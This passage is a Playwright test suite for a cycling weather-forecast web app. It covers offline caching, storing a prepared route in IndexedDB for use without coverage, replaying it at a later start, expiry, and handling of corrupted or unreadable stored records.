      entry.timestamp = Date.now() - mins * 60000;
      localStorage.setItem(key, JSON.stringify(entry));
    }
  }, minutes);

test('an expired forecast is still shown when there is no connection', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // An hour and forty minutes later, out of coverage.
  await ageTheCache(page, 100);
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  // The forecast is what was downloaded earlier, and the app says how old it is.
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  expect(await shownTemperatures(page)).toContain('21º');
  await expect(page.locator('.notice')).toContainText('1 h 40 min');
});

test('a stale forecast is never used while the connection works', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // Same age as the offline case, but the network is fine: it must refetch.
  await ageTheCache(page, 100);
  control.celsius = 5;
  await page.reload();
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const shown = await shownTemperatures(page);
  expect(shown, 'the old cached forecast was shown instead of a fresh one').not.toContain('21º');
  expect(shown).toContain('5º');
});

/* ---------- preparing for no coverage (spec §4.9.2) ---------- */

// Preparing used to pin cache entries and count them as points; it promised what reading without
// coverage could not find. It now stores the snapshot on screen, and counts only the points a
// replay can show for any start within three hours.

/** Open-Meteo as timezone=auto answers, from twelve hours before `now` to `hours` after it: wall-clock
 *  hours with their offset (UTC, so 0) and a different temperature every hour, its index. */
function forecastAround(now, hours = 72) {
  const first = Math.floor(now / 3600000) * 3600000 - 12 * 3600000;
  const time = [];
  for (let t = first; t <= first + (12 + hours) * 3600000; t += 3600000) time.push(new Date(t).toISOString().slice(0, 16));
  const fill = (f) => time.map((_, i) => f(i));
  return {
    utc_offset_seconds: 0,
    hourly: {
      time, temperature_2m: fill((i) => i), precipitation: fill(() => 0), precipitation_probability: fill(() => 5),
      relative_humidity_2m: fill(() => 60), wind_speed_10m: fill(() => 12), wind_gusts_10m: fill(() => 20),
      winddirection_10m: fill(() => 180), weathercode: fill(() => 1), uv_index: fill(() => 3), is_day: fill(() => 1),
      cloud_cover: fill(() => 20),
    },
  };
}

/** Nothing reachable but Open-Meteo, which answers forecastAround(control.now or the real clock).
 *  `control.hours(url)` can cut an answer short; `control.fail` answers every forecast with a 500;
 *  `control.held`, a promise, holds every forecast until it resolves. */
async function stubAround(page, control = {}) {
  await goOffline(page);
  await page.route((url) => url.hostname === 'api.open-meteo.com', async (route) => {
    const url = new URL(route.request().url());
    if (url.searchParams.get('timeformat') === 'unixtime') {
      return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(watchForecast(url)) });
    }
    control.asked = (control.asked || 0) + 1;
    if (control.offline) return route.abort();
    if (control.held) await control.held;
    if (control.fail) return route.fulfill({ status: 500, contentType: 'application/json', body: '{}' });
    const body = forecastAround(control.now ?? Date.now(), control.hours ? control.hours(url) : 72);
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(body) });
  });
}

/** The prepared record as IndexedDB holds it, or null. Opens the database the way the app does. */
const preparedStored = (page) =>
  page.evaluate(() => new Promise((resolve) => {
    const req = indexedDB.open('meteoride_prepared', 1);
    req.onupgradeneeded = () => req.result.createObjectStore('snapshot');
    req.onerror = () => resolve('open failed');
    req.onsuccess = () => {
      const db = req.result;
      const get = db.transaction('snapshot', 'readonly').objectStore('snapshot').get('current');
      get.onsuccess = () => { db.close(); resolve(get.result ? JSON.parse(JSON.stringify(get.result)) : null); };
      get.onerror = () => { db.close(); resolve('read failed'); };
    };
  }));
const prepare = (page) => page.locator('#cwPrepareOffline').click();
const preparedNotice = /Route saved|Route only partly saved|Ruta preparada/;
const replacedNotice = /replaces the route|Sustituye a la ruta/;

async function routeWithForecast(page, control = {}) {
  await installNativeBridge(page);
  await stubAround(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
}

test('preparing with no forecast on screen says so and stores nothing', async ({ page }) => {
  let release;
  const control = { held: new Promise((r) => { release = r; }) };
  await installNativeBridge(page);
  await stubAround(page, control);
  await page.goto('/index.html');
  await mapReady(page);

  // No route at all.
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(/Load a route|Carga una ruta/);

  // A route on screen whose forecast has not arrived yet.
  await page.evaluate(() => { document.querySelectorAll('.notice').forEach((n) => { n.textContent = ''; }); });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(routeName(page)).toContainText('Masnou');
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(/Load a route|Carga una ruta/);
  expect(await page.evaluate(() => window.cwPreparedRecord())).toBeNull();
  expect(await preparedStored(page)).toBeNull();
  release();
});

test('preparing stores the forecast on screen with its route as read, and no identity or API key', async ({ page }) => {
  await installNativeBridge(page);
  await stubAround(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => { document.getElementById('apiKeyOW').value = 'a-valid-looking-key'; });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const shown = await page.evaluate(() => {
    const s = window.cw.currentSnapshot();
    return { fingerprint: s.route.fingerprint, steps: s.steps.length, alertsKey: s.settings.alertsKey };
  });
  expect(shown.alertsKey, 'the snapshot on screen holds the key in memory').toBe('a-valid-looking-key');

  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  const record = await preparedStored(page);
  expect(record.version).toBe(1);
  expect(record.gpx).toEqual({ text: await readFile(FIXTURE, 'utf8'), name: 'route.gpx' });
  expect(record.snapshot.route.fingerprint).toBe(shown.fingerprint);
  expect(record.snapshot.origin).toBe('live');
  expect(record.snapshot.steps).toHaveLength(shown.steps);
  expect(record.snapshot.settings.speed).toBe(12);
  expect(Number.isFinite(record.snapshot.settings.start)).toBe(true);
  expect(record.snapshot).not.toHaveProperty('requestId');
  expect(record.snapshot).not.toHaveProperty('computationId');
  expect(record.snapshot.settings).not.toHaveProperty('keys');
  expect(record.snapshot.settings).not.toHaveProperty('alertsKey');
  expect(JSON.stringify(record)).not.toContain('a-valid-looking-key');
  expect(await page.evaluate(() => window.cwPreparedRecord()?.snapshot.route.fingerprint)).toBe(shown.fingerprint);
});

test('preparing counts the points that keep a forecast for every start within three hours', async ({ page }) => {
  const control = {};
  await routeWithForecast(page, control);
  const total = await page.evaluate(() => window.cw.currentSnapshot().steps.length);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(new RegExp(`all ${total} points|los ${total} puntos`));

  // The answer for the last point now ends an hour after the start: a start three hours later
  // reads nothing there.
  control.hours = (url) => (url.searchParams.get('latitude') === '41.468' ? 1 : 72);
  await forgetForecasts(page);
  await setSpeed(page, 13);
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.settings.speed)).toBe(13);
  const again = await page.evaluate(() => window.cw.currentSnapshot().steps.length);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(new RegExp(`${again - 1} (of|de) ${again}`));
  await expect(page.locator('.notice')).not.toContainText(/all \d+ points|los \d+ puntos/);
});

test('preparing says so when the prepared route cannot be stored, and keeps nothing', async ({ page }) => {
  await routeWithForecast(page);
  await page.evaluate(() => {
    const put = IDBObjectStore.prototype.put;
    IDBObjectStore.prototype.put = function (...args) {
      const request = put.apply(this, args);
      if (this.name === 'snapshot') request.addEventListener('success', () => request.transaction.abort());
      return request;
    };
  });

  await prepare(page);
  await expect(page.locator('.notice')).toContainText(/Could not save the prepared|No se ha podido guardar la ruta preparada/);
  expect(await page.evaluate(() => window.cwPreparedRecord())).toBeNull();
  expect(await preparedStored(page)).toBeNull();
});

test('preparing another route replaces the one prepared before and says so; the same route again does not', async ({ page }) => {
  await routeWithForecast(page);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  await expect(page.locator('.notice')).not.toContainText(replacedNotice);

  await pickText(page, 'otra.gpx', routeAt('Otra', 41.40));
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.route.name)).toBe('otra.gpx');
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(replacedNotice);
  expect((await preparedStored(page)).gpx.name).toBe('otra.gpx');

  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  await expect(page.locator('.notice')).not.toContainText(replacedNotice);
});

test('preparing a forecast with no point covered stores nothing and keeps the route prepared before', async ({ page }) => {
  const control = {};
  await routeWithForecast(page, control);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);

  // Another route whose forecast came out empty.
  control.fail = true;
  await pickText(page, 'otra.gpx', routeAt('Otra', 41.40));
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.route.name)).toBe('otra.gpx');
  await page.evaluate(() => { document.querySelectorAll('.notice').forEach((n) => { n.textContent = ''; }); });
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(/\S/);
  await page.waitForTimeout(300);
  expect((await preparedStored(page)).gpx.name).toBe('route.gpx');
  expect(await page.evaluate(() => window.cwPreparedRecord()?.gpx.name)).toBe('route.gpx');
  await expect(page.locator('.notice')).toContainText(/Nothing saved|No se ha guardado nada/);
});

/* ---------- replaying a prepared forecast (spec §4.9.3) ---------- */

const noLongerOnline = (page) =>
  page.evaluate(() => Object.defineProperty(navigator, 'onLine', { configurable: true, get: () => false }));
const shownOrigin = (page) => page.evaluate(() => window.cw.currentSnapshot()?.origin ?? null);
const localAt = (ms) => new Date(ms - new Date(ms).getTimezoneOffset() * 60000).toISOString().slice(0, 16);
const resume = (page) => page.evaluate(() => window.__appListeners.appStateChange({ isActive: true }));
const T0 = Date.parse('2026-09-20T08:00:00');   // local time, in the browser as in Node
// The fake clock runs on from the moment it is installed, and a start counts the seconds when it is
// rounded up to the quarter hour: installed a minute early, "now" stays just under the quarter a
// test names. That is a budget: a test still running 60 s of real time after installing it (plus any
// fastForward) rounds to the next quarter. Pausing the clock is not an option: nothing in the page
// (polls, IndexedDB callbacks, the provider pauses) would run without advancing it by hand.
const startClock = (page, at = T0) => page.clock.install({ time: at - 60000 });

test('coming back without coverage 45 minutes later replays the prepared forecast at the new start, and nothing replaces it', async ({ page }) => {
  const control = { now: T0 };
  const sec = Math.floor(T0 / 1000);
  await startClock(page);
  await installNativeBridge(page);
  await stubAround(page, control);
  await page.route((url) => url.hostname === 'api.openweathermap.org', (route) => route.fulfill({
    status: 200, contentType: 'application/json',
    body: JSON.stringify({ alerts: [
      { sender_name: 'AEMET', event: 'Aviso que acaba pronto', start: sec - 3600, end: sec + 30 * 60, description: 'x' },
      { sender_name: 'AEMET', event: 'Aviso de toda la mañana', start: sec - 3600, end: sec + 4 * 3600, description: 'x' },
    ] }),
  }));
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => { document.getElementById('apiKeyOW').value = 'a-valid-looking-key'; });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  const alerts = page.locator('#weather-alerts-container');
  await expect(alerts).toContainText('Aviso que acaba pronto');
  expect((await shownTemperatures(page))[0]).toBe('12º');   // 08:00, twelve hours into the answer
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);

  // Out of coverage, three quarters of an hour later.
  await noLongerOnline(page);
  const asked = control.asked;
  await page.clock.fastForward('45:00');
  await countLaunches(page);
  await resume(page);

  await expect(startField(page)).toHaveValue(localAt(T0 + 45 * 60000));
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  expect((await shownTemperatures(page))[0]).toBe('13º');   // 08:45 reads 09:00
  await expect(alerts).toContainText('Aviso de toda la mañana');
  await expect(alerts).not.toContainText('Aviso que acaba pronto');
  await expect(page.locator('.notice')).toContainText(/saved 45 min ago for a 08:00 start|hace 45 min para salir a las 08:00/);
  await page.waitForTimeout(1500);
  expect(await shownOrigin(page)).toBe('prepared');
  expect((await page.evaluate(() => window.__launches)).launch).toBe(1);
  expect(control.asked, 'a provider was asked without coverage').toBe(asked);
});

test('with coverage but every provider failing, the prepared forecast is replayed', async ({ page }) => {
  const control = { now: T0 };
  await startClock(page);
  await routeWithForecast(page, control);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);

  control.fail = true;
  await forgetForecasts(page);
  await page.clock.fastForward('45:00');
  await resume(page);
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  expect((await shownTemperatures(page))[0]).toBe('13º');
  await expect(page.locator('.notice')).toContainText(/saved 45 min ago|hace 45 min/);

  // With coverage, a change over the replay is computed like any other (and, still failing, replays).
  const id = await page.evaluate(() => window.cw.currentSnapshot().computationId);
  await setTempUnits(page, 'F');
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.computationId)).toBeGreaterThan(id);
  await expect(page.locator('.notice')).not.toContainText(/cannot be computed again|no se puede recalcular/);
});

test('with compare chosen and no coverage, the replayed forecast stays with a notice and nothing is compared', async ({ page }) => {
  const control = { now: T0 };
  await startClock(page);
  await routeWithForecast(page, control);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);

  await noLongerOnline(page);
  await watchComparisons(page);
  await selectProvider(page, 'compare');
  expect((await shownTemperatures(page))[0]).toBe('12º');
  await page.clock.fastForward('45:00');
  await resume(page);
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  // The replayed table is painted even with compare chosen: its hours and its values.
  await expect.poll(async () => (await shownTemperatures(page))[0]).toBe('13º');
  expect((await shownTimes(page))[0]).toContain('08:45');
  await expect(page.locator('.notice')).toContainText(/Comparing providers needs coverage|Comparar proveedores necesita cobertura/);
  await page.waitForTimeout(800);
  expect(await comparisonsLaunched(page)).toBe(0);
  expect(await compareShown(page)).toBe(false);
});

test('opening without coverage with compare saved shows the replayed table and says comparing needs coverage', async ({ page }) => {
  await prepareThenLoseCoverage(page, { now: T0 }, '45:00');
  await selectProvider(page, 'compare');
  await page.reload();
  await mapReady(page);

  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  await expect.poll(async () => (await shownTemperatures(page))[0]).toBe('13º');   // 08:45 reads 09:00
  await expect(page.locator('.notice')).toContainText(/Comparing providers needs coverage|Comparar proveedores necesita cobertura/);
  expect(await compareShown(page)).toBe(false);
  // And its wind markers on the map.
  await expect.poll(() => page.evaluate(() => document.querySelectorAll('.leaflet-wind-pane .leaflet-marker-icon').length))
    .toBeGreaterThan(0);
});

// The replayed table paints normally with compare chosen (no comparison can run over it): a language
// change must still repaint it, not skip the repaint because compare is chosen in the field.
test('opening without coverage with compare saved, changing language repaints the replayed table', async ({ page }) => {
  await prepareThenLoseCoverage(page, { now: T0 }, '45:00');
  await selectProvider(page, 'compare');
  await page.reload();
  await mapReady(page);
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  expect(await compareShown(page)).toBe(false);

  const label = () => page.evaluate(() => document.querySelector('#weatherTable .unit-temp')?.parentElement.textContent);
  const before = await label();
  await flipControl(page, 'language');
  await expect.poll(label).not.toBe(before);
});

// With compare chosen the forecast asks Open-Meteo. Its steps labelled 'compare' never counted as usable:
// a usable prepared snapshot replayed over working answers, and compare stayed off for up to three hours.
test('with compare chosen and the route prepared, working answers are published live and compared', async ({ page }) => {
  await startClock(page);
  await routeWithForecast(page, { now: T0 });
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);

  await watchComparisons(page);
  await forgetForecasts(page);
  const id = await page.evaluate(() => window.cw.currentSnapshot().computationId);
  await setSpeed(page, 13);
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.computationId)).toBeGreaterThan(id);
  expect(await shownOrigin(page)).toBe('live');
  await expect.poll(() => comparisonsLaunched(page)).toBe(1);
});

test('with compare chosen, preparing stores the forecast computed for it', async ({ page }) => {
  await routeWithForecast(page);
  await selectProvider(page, 'compare');
  await expect.poll(() => compareShown(page)).toBe(true);
  const id = await page.evaluate(() => window.cw.currentSnapshot().computationId);
  await setSpeed(page, 13);
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.computationId)).toBeGreaterThan(id);
  await prepare(page);
  await expect.poll(async () => (await preparedStored(page))?.snapshot.settings.speed ?? null).toBe(13);
});

test('with coverage, every provider failing and compare chosen, the replay keeps its age notice and nothing is compared', async ({ page }) => {
  const control = { now: T0 };
  await startClock(page);
  await recordNotices(page);
  await routeWithForecast(page, control);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);

  control.fail = true;
  await forgetForecasts(page);
  await selectProvider(page, 'compare');
  await watchComparisons(page);
  await page.clock.fastForward('45:00');
  await resume(page);
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  await expect(page.locator('.notice')).toContainText(/saved 45 min ago|hace 45 min/);
  await page.waitForTimeout(800);
  await expect(page.locator('.notice')).toContainText(/saved 45 min ago|hace 45 min/);
  expect(await comparisonsLaunched(page)).toBe(0);
  const since = await page.evaluate(() => window.__notices.findLastIndex((n) => /saved 45 min ago|hace 45 min/.test(n)));
  expect(await page.evaluate((i) => window.__notices.slice(i).join(' | '), since))
    .not.toMatch(/Comparing providers needs coverage|Comparar proveedores necesita cobertura/);
});

// Moving a replay changes the hours of the watched points: what was already notified stays, the
// baseline is read again (spec §4.6).
test('a replay moved to a new start keeps what the ride alert already notified, and leaves its baseline to be read again', async ({ page }) => {
  const control = { now: T0 };
  await startClock(page);
  await installNativeBridge(page);
  await stubAround(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await armedWatches(page)).length).toBe(1);
  const before = await lastStored(page);
  expect(Array.isArray(before.baseline)).toBe(true);
  await markStoredWatch(page);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);

  await noLongerOnline(page);
  control.offline = true;
  await page.clock.fastForward('45:00');
  await resume(page);
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  await expect.poll(async () => (await armedWatches(page)).length).toBe(2);
  const watch = await lastStored(page);
  const firstStep = await page.evaluate(() => new Date(window.cw.currentSnapshot().steps[0].time).getTime());
  expect(watch.start).toBe(firstStep);
  expect(watch.start).toBeGreaterThan(before.start);
  expect(watch.notified).toEqual(['AEMET_Viento_1_2']);
  expect(watch.baseline).toBeNull();
});

/* ---------- opening the app on a prepared route (spec §4.7, §4.9.3) ---------- */

const expiredNotice = /prepared route no longer fits|ruta preparada ya no sirve/;

/** Prepares the route on screen at T0 (with `start` as the start field, if given), then closes the
 *  app, loses coverage and lets `later` pass (a clock string); the caller reopens or resumes. */
async function prepareThenLoseCoverage(page, control, later, start) {
  await startClock(page);
  await installNativeBridge(page);
  await stubAround(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  if (start) await chooseStart(page, start);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  control.offline = true;
  await page.addInitScript(() => Object.defineProperty(navigator, 'onLine', { configurable: true, get: () => false }));
  await noLongerOnline(page);
  await page.clock.fastForward(later);
}

test('opening without coverage four hours later drops the prepared route and says the forecast needs coverage', async ({ page }) => {
  const control = { now: T0 };
  await recordNotices(page);
  await prepareThenLoseCoverage(page, control, '04:00:00');
  await page.reload();
  await mapReady(page);

  await expect.poll(() => page.evaluate(() => window.__notices.join(' | '))).toMatch(expiredNotice);
  await expect.poll(() => preparedStored(page)).toBeNull();
  expect(await page.evaluate(() => window.cwPreparedRecord())).toBeNull();
  expect(await shownOrigin(page)).not.toBe('prepared');
});

test('coming back without coverage four hours later drops the prepared route too', async ({ page }) => {
  const control = { now: T0 };
  await recordNotices(page);
  await prepareThenLoseCoverage(page, control, '04:00:00');
  await resume(page);

  await expect.poll(() => page.evaluate(() => window.__notices.join(' | '))).toMatch(expiredNotice);
  await expect.poll(() => preparedStored(page)).toBeNull();
  expect(await page.evaluate(() => window.cwPreparedRecord())).toBeNull();
});

// Expiry follows the distance between the two starts, not the age of what was prepared.
test('a route prepared twelve hours before its start and opened half an hour after that start is replayed', async ({ page }) => {
  const control = { now: T0 };
  await prepareThenLoseCoverage(page, control, '12:30:00', localAt(T0 + 12 * 3600000));
  await page.reload();
  await mapReady(page);

  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  await expect(startField(page)).toHaveValue(localAt(T0 + 12.5 * 3600000));
  expect((await shownTemperatures(page))[0]).toBe('24º');   // 20:30 reads 20:00, a tie that keeps the earlier hour
  expect(await preparedStored(page)).not.toBeNull();
});

test('a route prepared for a start hours ahead is kept when the app comes back before then', async ({ page }) => {
  const control = { now: T0 };
  await prepareThenLoseCoverage(page, control, '10:00', localAt(T0 + 5 * 3600000));
  await resume(page);
  await page.waitForTimeout(500);
  expect(await preparedStored(page)).not.toBeNull();
  expect(await page.evaluate(() => window.cwPreparedRecord())).not.toBeNull();
});

test('a prepared route that is not the newest recent route opens and is replayed all the same', async ({ page }) => {
  const control = { now: T0 };
  await startClock(page);
  await routeWithForecast(page, control);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  await pickText(page, 'otra.gpx', routeAt('Otra', 41.40));
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.route.name)).toBe('otra.gpx');
  // The newest recent route, the one a restore would read.
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes()[0]?.name)).toBe('otra.gpx');

  control.offline = true;
  await page.addInitScript(() => Object.defineProperty(navigator, 'onLine', { configurable: true, get: () => false }));
  await page.clock.fastForward('45:00');
  await page.reload();
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
});

test('a route shared at start-up still wins over the prepared route', async ({ page }) => {
  const control = { now: T0 };
  await prepareThenLoseCoverage(page, control, '45:00');
  // The share waits in the native inbox for the next start.
  await installNativeBridge(page, { routes: [{ name: 'shared.gpx', gpx: routeAt('Compartida', 40.42) }] });
  await page.reload();
  await mapReady(page);

  await expect(routeName(page)).toHaveText('Compartida');
  await page.waitForTimeout(1500);
  await expect(routeName(page)).toHaveText('Compartida');
  expect(await page.evaluate(() => window.lastGPXFile.name)).toBe('shared.gpx');
});

/** Spoils the stored prepared record: 'gpx' (a text that is no route), 'units' (none), 'step' (a step that
 *  is not one) or 'version' (another one). */
const spoilPrepared = (page, how) =>
  page.evaluate((k) => new Promise((resolve) => {
    const req = indexedDB.open('meteoride_prepared', 1);
    req.onsuccess = () => {
      const db = req.result;
      const tx = db.transaction('snapshot', 'readwrite');
      const store = tx.objectStore('snapshot');
      store.get('current').onsuccess = (e) => {
        const r = e.target.result;
        if (k === 'gpx') r.gpx = { text: 'not a route', name: 'broken.gpx' };
        if (k === 'units') delete r.snapshot.settings.units;
        if (k === 'step') r.snapshot.steps[0] = null;
        if (k === 'version') r.version = 2;
        store.put(r, 'current');
      };
      tx.oncomplete = () => { db.close(); resolve(); };
    };
  }), how);

/** From the next page on, the `nth` opening of the prepared database answers only once the page calls
 *  window.__releasePrepared(); window.__preparedHeld is true while it waits. */
const holdPreparedOpen = (page, nth) =>
  page.addInitScript((n) => {
    let opens = 0;
    const released = new Promise((r) => { window.__releasePrepared = r; });
    const open = IDBFactory.prototype.open;
    IDBFactory.prototype.open = function (name, ...rest) {
      const req = open.call(this, name, ...rest);
      if (name !== 'meteoride_prepared' || ++opens !== n) return req;
      let handler = null;
      Object.defineProperty(req, 'onsuccess', { configurable: true, get: () => handler, set: (fn) => { handler = fn; } });
      req.addEventListener('success', async (e) => {
        window.__preparedHeld = true;
        await released;
        if (handler) handler.call(req, e);
      });
      return req;
    };
  }, nth);

test('a prepared route whose text cannot be opened is dropped at start-up, and the last recent route opens instead', async ({ page }) => {
  const control = { now: T0 };
  await prepareThenLoseCoverage(page, control, '45:00');
  await spoilPrepared(page, 'gpx');
  await page.reload();
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect.poll(() => preparedStored(page)).toBeNull();
  expect(await page.evaluate(() => window.cwPreparedRecord())).toBeNull();
});

// The restore opened the recent route after awaiting the delete, as a new request: a route picked during
// that wait was replaced by it.
test('a route picked while a broken prepared route is being deleted at start-up wins: no recent route opens over it', async ({ page }) => {
  await prepareThenLoseCoverage(page, { now: T0 }, '45:00');
  await spoilPrepared(page, 'gpx');
  // The first opening reads the record at start-up; the second deletes it.
  await holdPreparedOpen(page, 2);
  await page.reload();
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => !!window.__preparedHeld)).toBe(true);

  await countLaunches(page);
  await pickText(page, 'otra.gpx', routeAt('Otra', 41.40));
  await expect(routeName(page)).toHaveText('Otra');
  await page.evaluate(() => window.__releasePrepared());
  await expect.poll(() => preparedStored(page)).toBeNull();
  await page.waitForTimeout(1500);
  await expect(routeName(page)).toHaveText('Otra');
  expect((await page.evaluate(() => window.__launches)).requestRoute, 'the restore asked for a route again').toBe(1);
});

test('a broken prepared route that cannot be deleted is tried once at start-up, not again and again', async ({ page }) => {
  await prepareThenLoseCoverage(page, { now: T0 }, '45:00');
  await spoilPrepared(page, 'gpx');
  await page.addInitScript(() => {
    window.__routeFailures = 0;
    const del = IDBObjectStore.prototype.delete;
    IDBObjectStore.prototype.delete = function (...args) {
      const request = del.apply(this, args);
      if (this.name === 'snapshot') request.addEventListener('success', () => request.transaction.abort());
      return request;
    };
    let notify;
    Object.defineProperty(window, 'cwNotifyRouteFailure', {
      configurable: true,
      get: () => notify && ((...args) => { window.__routeFailures++; return notify(...args); }),
      set: (fn) => { notify = fn; },
    });
  });
  await page.reload();
  await mapReady(page);

  await expect.poll(() => page.evaluate(() => window.__routeFailures)).toBeGreaterThan(0);
  await page.waitForTimeout(1500);
  expect(await page.evaluate(() => window.__routeFailures)).toBe(1);
});

// A route arriving before the restore (a link, the sessionStorage handoff) can be computed before the
// prepared record is read: its empty table used to stay.
test('a route handed over at start-up and computed before the prepared route was read is replayed once it has been', async ({ page }) => {
  await prepareThenLoseCoverage(page, { now: T0 }, '45:00');
  const text = await readFile(FIXTURE, 'utf8');
  await page.evaluate((t) => { sessionStorage.setItem('cw_gpx_text', t); sessionStorage.setItem('cw_gpx_name', 'route.gpx'); }, text);
  await holdPreparedOpen(page, 1);
  await page.reload();
  await mapReady(page);

  // Out of coverage and without the record, the route computes and finds nothing.
  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.outcome.usableSteps ?? null)).toBe(0);
  expect(await shownOrigin(page)).toBe('live');
  await page.evaluate(() => window.__releasePrepared());
  await expect.poll(() => shownOrigin(page)).toBe('prepared');
  expect((await shownTemperatures(page))[0]).toBe('13º');   // 08:45 reads 09:00
});

test('a route handed over at start-up with its forecast already on screen launches nothing more once the prepared route is read', async ({ page }) => {
  await startClock(page);
  await routeWithForecast(page, { now: T0 });
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  const text = await readFile(FIXTURE, 'utf8');
  await page.evaluate((t) => { sessionStorage.setItem('cw_gpx_text', t); sessionStorage.setItem('cw_gpx_name', 'route.gpx'); }, text);
  await holdPreparedOpen(page, 1);
  await page.reload();
  await mapReady(page);

  await expect.poll(() => page.evaluate(() => window.cw.currentSnapshot()?.outcome.usableSteps ?? 0)).toBeGreaterThan(0);
  await countLaunches(page);
  await page.evaluate(() => window.__releasePrepared());
  await expect.poll(() => page.evaluate(() => window.cwPreparedRecord()?.gpx.name ?? null)).toBe('route.gpx');
  await page.waitForTimeout(800);
  expect((await page.evaluate(() => window.__launches)).launch).toBe(0);
  expect(await shownOrigin(page)).toBe('live');
});

// A record missing what a replay reads used to pass the check: the replay threw, and the record stayed.
for (const [what, how] of [['without units', 'units'], ['with a step that is not one', 'step'], ['of another version', 'version']]) {
  test(`a prepared record ${what} is dropped without a word, and the last recent route opens with nothing replayed`, async ({ page }) => {
    const { crashes } = watchForBreakage(page);
    await recordNotices(page);
    await prepareThenLoseCoverage(page, { now: T0 }, '45:00');
    await spoilPrepared(page, how);
    await page.reload();
    await mapReady(page);

    await expect(routeName(page)).toContainText('Masnou');
    await expect.poll(() => preparedStored(page)).toBeNull();
    expect(await page.evaluate(() => window.cwPreparedRecord())).toBeNull();
    await page.waitForTimeout(800);
    expect(await shownOrigin(page)).not.toBe('prepared');
    expect(await page.evaluate(() => window.__notices.join(' | '))).not.toMatch(/API error|Error API/);
    expect(crashes).toEqual([]);
  });
}

test('a prepared route that cannot be read back keeps the copy in memory', async ({ page }) => {
  await routeWithForecast(page);
  await prepare(page);
  await expect(page.locator('.notice')).toContainText(preparedNotice);
  await page.evaluate(() => {
    window.__get = IDBObjectStore.prototype.get;
    IDBObjectStore.prototype.get = function () { throw new Error('the read failed'); };
  });
  expect(await page.evaluate(() => window.cwLoadPreparedRecord().then((r) => r?.gpx.name ?? null))).toBe('route.gpx');
  expect(await page.evaluate(() => window.cwPreparedRecord()?.gpx.name ?? null)).toBe('route.gpx');

  // Nor when the database does not open.
  await page.evaluate(() => {
    IDBObjectStore.prototype.get = window.__get;
